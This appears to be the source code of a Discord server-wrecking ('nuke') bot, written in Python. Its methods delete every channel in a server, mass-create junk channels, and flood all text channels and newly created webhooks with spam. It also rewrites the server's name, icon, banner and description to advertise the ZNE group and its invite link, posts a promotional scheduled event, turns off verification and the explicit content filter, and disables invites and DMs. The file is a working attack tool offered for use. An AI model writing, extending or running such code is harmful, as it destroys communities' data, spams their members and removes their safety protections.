from __future__ import annotations
import asyncio
import os
import logging
import random
from typing import Optional

import aiohttp
import discord
from aiolimiter import AsyncLimiter
from discord import utils

from .settings import Settings, State, MISSING, now as utils_now
from .ratelimit import limiter


class Operations:
    def __init__(self, bot: discord.Client):
        self.bot = bot
        self.settings: Settings = Settings.load()
        self.session: Optional[aiohttp.ClientSession] = None
        self.limiter: Optional[AsyncLimiter] = None
        self.http_limiter: Optional[limiter] = None

    async def setup(self):
        if not hasattr(self.bot.http, "fast_limiter"):
            self.bot.http.fast_limiter = limiter(self.bot.http)
        self.http_limiter = self.bot.http.fast_limiter
        self.session = aiohttp.ClientSession()
        rps = max(1, self.settings.requests_per_second)
        self.limiter = AsyncLimiter(rps, 1)

    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()
        if self.http_limiter:
            await self.http_limiter.close()

    async def _req(self, method: str, url: str, **kwargs):
        async with self.limiter:
            return await self.session.request(method, url, **kwargs)

    def _pick_name(self) -> str:
        names = self.settings.channel_names
        return random.choice(names) if names else "fluked"

    async def CrChannel(self, guild: discord.Guild) -> int:
        count = self.settings.channel_count
        tasks = []
        for i in range(count):
            name = f"{self._pick_name()}-{i}" if count > len(self.settings.channel_names) else self._pick_name()
            tasks.append(asyncio.create_task(self._create_channel(guild, name)))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return sum(1 for r in results if not isinstance(r, Exception) and r is not None)

    async def _create_channel(self, guild: discord.Guild, name: str):
        try:
            return await guild.create_text_channel(name=name)
        except (discord.Forbidden, discord.HTTPException):
            return None

    async def DelChannels(self, guild: discord.Guild) -> int:
        channels = list(guild.channels)
        tasks = [asyncio.create_task(self._delete_channel(c)) for c in channels]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return sum(1 for r in results if not isinstance(r, Exception) and r)

    async def _delete_channel(self, channel: discord.abc.GuildChannel) -> bool:
        try:
            return await channel.delete()
        except (discord.Forbidden, discord.HTTPException, AttributeError):
            return False

    async def spam(self, guild: discord.Guild) -> int:
        text_channels = [c for c in guild.text_channels if c.permissions_for(guild.me).send_messages]
        if not text_channels:
            return 0
        tasks = []
        for _ in range(self.settings.spam_count):
            for channel in text_channels:
                tasks.append(asyncio.create_task(self._send_spam(channel)))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return sum(1 for r in results if not isinstance(r, Exception) and r is not None)

    async def _send_spam(self, channel: discord.TextChannel):
        try:
            return await channel.send(self.settings.spam_message)
        except (discord.Forbidden, discord.HTTPException):
            return None

    async def mess_server(self, guild: discord.Guild) -> None:
        settings = self.settings
        server_banner = MISSING
        server_splash = MISSING
        server_icon = None
        icon_path = "assets/zne.png"
        banner_path = "assets/zne_banner.png"

        if os.path.exists(icon_path):
            with open(icon_path, "rb") as file:
                server_icon = file.read()

        if guild.premium_tier > 1 and os.path.exists(banner_path):
            with open(banner_path, "rb") as file:
                server_splash = file.read()
            server_banner = server_splash

        for event in list(guild.scheduled_events):
            asyncio.create_task(self._safe(event.delete))

        asyncio.create_task(
            guild.create_scheduled_event(
                name=State.get_phrase(),
                start_time=utils_now(seconds=3),
                end_time=utils_now().replace(year=2029),
                entity_type=discord.EntityType.external,
                privacy_level=discord.PrivacyLevel.guild_only,
                location="https://discord.gg/Y6qZ4TKRM5 | https://zne.breed.rip",
                image=server_banner if server_banner is not MISSING else discord.MISSING,
                description="Join ZNE and start dominating servers today! https://discord.gg/Y6qZ4TKRM5",
            )
        )

        try:
            kwargs = dict(
                name=settings.server_name,
                description="This place has been obliterated by https://discord.gg/Y6qZ4TKRM5. Join now if you want a bot like this.",
                community=False,
                default_notifications=discord.NotificationLevel.all_messages,
                discoverable=False,
                widget_enabled=False,
                dms_disabled_until=utils_now(days=1),
                invites_disabled_until=utils_now(days=1),
                premium_progress_bar_enabled=True,
                verification_level=discord.VerificationLevel.none,
                explicit_content_filter=discord.ContentFilter.disabled,
            )
            if server_icon:
                kwargs["icon"] = server_icon
            if server_splash is not MISSING:
                kwargs["splash"] = server_splash
            if server_banner is not MISSING:
                kwargs["banner"] = server_banner
            await guild.edit(**kwargs)
        except discord.Forbidden:
            return
        except discord.HTTPException:
            return

    async def _safe(self, coro):
        try:
            await coro
        except Exception:
            pass

    async def spam_webhook(self, guild: discord.Guild) -> int:
        text_channels = [c for c in guild.text_channels if c.permissions_for(guild.me).manage_webhooks]
        if not text_channels:
            return 0

        webhook_tasks = [asyncio.create_task(self._create_webhook(c)) for c in text_channels]
        webhooks = await asyncio.gather(*webhook_tasks, return_exceptions=True)
        valid = [w for w in webhooks if not isinstance(w, Exception) and w is not None]

        if not valid:
            return 0

        send_tasks = []
        for _ in range(self.settings.webhook_count):
            for wh in valid:
                send_tasks.append(asyncio.create_task(self._send_webhook(wh)))

        results = await asyncio.gather(*send_tasks, return_exceptions=True)
        return sum(1 for r in results if not isinstance(r, Exception) and r is not None)

    async def _create_webhook(self, channel: discord.TextChannel):
        try:
            return await channel.create_webhook(name=self.settings.webhook_name)
        except (discord.Forbidden, discord.HTTPException):
            return None

    async def _send_webhook(self, webhook: discord.Webhook) -> bool:
        try:
            await webhook.send(
                self.settings.webhook_message,
                username=self.settings.webhook_name,
                wait=False,
            )
            return True
        except (discord.HTTPException, discord.NotFound):
            return False
